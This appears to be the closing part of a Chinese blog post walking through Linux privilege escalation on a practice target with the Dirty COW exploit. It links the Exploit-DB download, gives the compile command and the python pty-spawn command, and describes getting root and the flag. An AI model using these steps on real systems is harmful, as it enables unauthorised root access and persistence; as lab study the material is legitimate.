+<blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://www.exploit-db.com/download/40611">http://www.exploit-db.com/download/40611</a></p>
+</blockquote>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624204557669.png" alt="image-20220624204557669"></p>
+<p>这里下载完是一个文件，不是c文件，需要重命名或者从本地上传至靶机。</p>
+<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p>本地下载好40611.cpp文件上传至靶机：<br><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624210315111.png" alt="image-20220624210315111"></p>
+<h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><blockquote>
+<p>使用以下命令编译：<br>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dcow 40611.cpp -lutil</p>
+</blockquote>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624210640766.png" alt="image-20220624210640766"></p>
+<p>编译出dcow这个文件。</p>
+<h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><p>这里漏洞若要利用必须开一个模拟终端，这是漏洞成因造成的。因为产生一个交互式shell，就比如shell输入密码需要交互是一个道理。这里使用python产生一个伪终端。</p>
+<blockquote>
+<p>产生交互式命令：<br>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+</blockquote>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624210653315.png" alt="image-20220624210653315"></p>
+<p>这里获取到了root的密码（不是真正的修改，而是临时copy的一个root权限 )。</p>
+<h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><p>root登录在&#x2F;root目录下获取flag(这里可以以root创建一个新用户，加入root用户组，然后登录靶机) </p>
+<p><img src="/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831.htm/image-20220624210740592.png" alt="image-20220624210740592"></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">小白</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://NoobXW.github.io/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/">http://NoobXW.github.io/2022/06/23/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%831/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">小白</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+                                    <span class="chip bg-color">权限提升</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/06/25/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E6%8F%90%E6%9D%832/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="权限提升-Linux提权2">
+                        
+                        <span class="card-title">权限提升-Linux提权2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>22-06-25
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="post-category">
+                                    权限提升
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+                        <span class="chip bg-color">权限提升</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/06/21/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="权限提升-windows提权2">
+                        
+                        <span class="card-title">权限提升-windows提权2</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>22-06-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" class="post-category">
+                                    权限提升
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+                        <span class="chip bg-color">权限提升</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 小白<br />'
+            + '文章作者: 小白<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="7286865560"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2023</span>
+            
+            <a href="/about" target="_blank">小白</a>
+            |&nbsp;Powered by&nbsp;梦想
+            |&nbsp;About&nbsp;我的博客
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">176.9k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="http://NoobXW.github.io" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:wangwei89677@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=3012254368" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 3012254368" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+            }
+        </script>
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
